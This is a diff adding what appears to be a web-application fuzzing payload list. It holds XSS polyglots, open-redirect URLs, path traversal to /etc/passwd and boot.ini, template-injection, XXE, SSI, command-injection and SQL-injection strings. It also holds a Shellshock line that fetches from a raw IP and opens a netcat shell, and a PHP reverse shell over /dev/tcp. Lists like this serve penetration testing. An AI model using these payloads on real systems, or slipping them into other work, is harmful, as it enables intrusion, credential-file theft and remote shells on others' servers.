@@ -1,0 +1,108 @@
+<</p>iframe src=javascript:alert()// 
+test*console.log(1337)//’;
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>` 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+'-eval("window['pro'%2B'mpt'](8)")-'
+javascript://google.com?name=%0Dalert(1)
+javascript:alert`0`
+javascript:alert(0)
+JavAscriPt:\u0061lert%605%60
+ja&Tab;vascr&NewLine;ipt:aler&#116(6)
+javascript:\u0061\u006c\u0065\u0072\u0074&#x28;7&#x29;
+JAvAscRIPT://%0O%61%6c%65%72%74.8
+////google.com/
+///google.com/%2f..
+https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/%09/javascript:alert(1)
+/\/google.com/
+//google%00.com
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@3627734734
+http://0330.072.0326.0316
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+/ーgoogle.com
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+/////google.com/
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+http://google.com:80#@example.com/
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd%00
+..///..///..///..///..///..///..///..///etc///passwd
+..///..///..///..///..///..///..///..///etc///passwd%2500
+..///..///..///..///..///..///..///..///etc///passwd%00
+..\..\..\..\..\..\..\..\etc\passwd%2500
+..\..\..\..\..\..\..\..\etc\passwd%00
+..\..\..\..\..\..\..\..\etc\passwd
+%00../../../../../../etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..\../..\../..\../..\../..\../..\../etc/passwd
+.//.//.//.//.//.//.//.//.//.//.//.//etc//passwd
+/../../../../../../../../../../etc/passwd^^
+..\../..\../..\../..\../..\../..\../boot.ini
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini
+../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+C:\boot.ini
+C:/boot.ini
+L2V0Yy9wYXNzd2Q=
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+QzpcYm9vdC5pbmkK
+QzovYm9vdC5pbmkK
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vYm9vdC5pbmk=
+{{7*7}}
+{{7*'7'}}
+${{7*7}}
+#{ 7 * 7 }
+	{{dump(app)}}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
+{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
+{{namespace.__init__.__globals__.os}}
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+%0Acat%20/etc/passwd
+%0a ping -i 30 127.0.0.1 %0a
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+%22%0A%20str%3D%24%28echo%20NFJEZO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522
+)%20or%20('x'='x
+(select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
+'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'
+0x770061006900740066006F0072002000640065006C00 ...
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+<?php echo shell_exec("whoami");?>
+<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
